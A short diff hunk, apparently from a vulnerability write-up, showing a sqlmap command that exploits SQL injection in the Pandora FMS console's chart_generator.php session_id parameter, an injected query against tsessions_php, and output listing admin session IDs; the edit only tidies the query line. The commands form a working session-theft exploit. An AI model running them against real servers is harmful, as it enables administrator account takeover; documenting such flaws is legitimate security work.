@@ -56,7 +56,7 @@ near '" ` % %% -- /* // ) ;' LIMIT 1' at line 1 ('SELECT * FROM tsessions_php WH
 
 ````sql
 sqlmap -u '127.0.0.1/pandora_console/include/chart_generator.php?session_id=*' --dbms=MySQL --sql-shell
-sql-shell> SELECT * FROM tsessions_php WHERE `id_session` = ''OR `data` LIKE '%id_usuario|s:5:"admin";%' [2]:
+sql-shell> SELECT * FROM tsessions_php WHERE `id_session` = ''OR `data` LIKE '%id_usuario|s:5:"admin";%'
 [*] id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;, gn7p2qba6310m05qn6iom3bvdf, 1642782084
 [*] id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0;, hj8tgic0fv8hmmb19b3j851af5, 1642779787
 ````
